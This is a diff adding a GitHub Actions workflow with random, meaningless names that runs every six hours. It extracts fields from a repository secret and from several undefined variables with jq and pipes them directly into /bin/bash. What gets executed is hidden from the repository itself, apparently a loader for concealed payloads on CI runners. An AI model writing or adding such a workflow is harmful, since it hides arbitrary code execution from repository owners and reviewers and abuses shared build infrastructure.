@@ -1,0 +1,25 @@
+name: fengdouou4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengdouou4567
+        env:
+          gwa4686: ${{ secrets.gwa4686 }}
+        run: |
+          echo $gwa4686 | jq -r .yko76 | /bin/bash
+          echo $hf66963 | jq -r .roami53363 | /bin/bash
+          echo $ult55 | jq -r .jvg5991 | /bin/bash
+          echo $oxbg1 | jq -r .xk1 | /bin/bash
+          echo $dd1 | jq -r .tx2882 | /bin/bash
+          echo $xulj972 | jq -r .z2027 | /bin/bash
+          echo $dzfwk769 | jq -r .qhzuv2987 | /bin/bash
+          echo $y62 | jq -r .qt12 | /bin/bash
+
